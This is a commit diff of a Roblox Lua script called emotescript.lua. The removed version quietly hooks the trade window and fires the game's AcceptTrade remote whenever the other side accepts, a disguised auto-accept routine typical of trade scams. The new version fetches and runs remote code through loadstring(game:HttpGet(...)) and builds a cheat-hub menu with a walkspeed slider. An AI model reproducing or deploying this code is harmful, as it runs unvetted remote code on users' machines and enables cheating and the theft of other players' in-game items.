b8bf2459ff49b4d46a024d12f42f5865a04013a6
modevs93 <mohammadshwiki039@gmail.com>
2024-09-11 18:23:38 +0300

    Update emotescript.lua

--- emotescript.lua
+++ emotescript.lua
@@ -1,24 +1,74 @@
-local PlaceId = game["PlaceId\0"]
-local LocalPlayer = game:GetService("Players").LocalPlayer
-local TradeUiPhone = LocalPlayer:WaitForChild("PlayerGui").TradeGUI_Phone.Container.Trade.TheirOffer.Accepted
-local TradeUi = LocalPlayer:WaitForChild("PlayerGui").TradeGUI.Container.Trade.TheirOffer.Accepted
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/REDzHUB/LibraryV2/main/redzLib")))()
 
-function ToDoWhenVisible()
-    if TradeUiPhone.Visible or TradeUi.Visible then
-        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(PlaceId * 2)
-    end
-end
+MakeWindow({
+  Hub = {
+    Title = "Water Hub",
+    Animation = "by : Cato"
+  },
+  Key = {
+    KeySystem = false,
+    Title = "Key System",
+    Description = "",
+    KeyLink = "water hub key system ",
+    Keys = {"1234"},
+    Notifi = {
+      Notifications = true,
+      CorrectKey = "Running the Script...",
+      Incorrectkey = "The key is incorrect",
+      CopyKeyLink = "Copied to Clipboard"
+    }
+  }
+})
 
-function ConnectTradeWindowFunction()
-    TradeUiPhone:GetPropertyChangedSignal("Visible"):Connect(ToDoWhenVisible)
-    TradeUi:GetPropertyChangedSignal("Visible"):Connect(ToDoWhenVisible)
-end
-ConnectTradeWindowFunction()
+--[[
+  Hub = {
+    Title = "REDz HUB" -- <string> Titulo do seu script
+    Animation = "by : redz9999" -- <string> Adiciona um texto na animacão do seu HUB
+  },
+  Key = {
+    KeySystem = <bollean> Adiciona um sistema de chaves
+    Title = "Key System" <string> Adiciona um titulo ao seu sistema de chaves
+    Description = "" <string> Adiciona uma descrição ao seu sistema de chaves
+    KeyLink = "" <string> Adicina o Link onde pega a chave do HUB
+    Keys = {"1234"} <table> Adiciona as Chaves
+    Notifi = {
+      Notifications = true <boolean> Adicina notificações ao sistema de chaves
+      CorrectKey = "Running the Script..." <string> notificação quando a chave estiver correta
+      Incorrectkey = "The key is incorrect" <string> notificação quando a chave estiver incorreta
+      CopyKeyLink = "Copied to Clipboard" <string> notificação quando o link da chave fir copiado
+    }
+  }
+]]
 
-LocalPlayer.CharacterAdded:Connect(function()
-    repeat task.wait(.1) until LocalPlayer:FindFirstChild("PlayerGui")
-    TradeUiPhone = LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.TheirOffer.Accepted
-    TradeUi = LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Accepted
-    task.wait()
-    ConnectTradeWindowFunction()
-end)
+local Main = MakeTab({Name = "Main"})
+
+--[[
+  Name = "Main" <string> Nome da guia
+]]
+
+local section = AddSection(Main, {"Teste"})
+--[[
+  {"Teste"} <table> nome da janela
+]]
+
+local Slider = AddSlider(Main, {
+  Name = "Slider walkspeed ",
+  MinValue = 10,
+  MaxValue = 100,
+  Default = 25,
+  Increase = 1,
+  Callback = function(Value)
+    
+  end
+})
+
+--[[
+  Name = "Slider walkspeed" <string> nome do controle deslizante
+  MinValue = 10 <number> valor minimo
+  MaxValue = 100 <number> valor maximo
+  Default = 25 <number> valor padrão
+  Increase = 1 <number> valor que almenta de acordo com a posição do 
+  Callback = function(Value)
+    função do controle deslizante
+  end
+]]
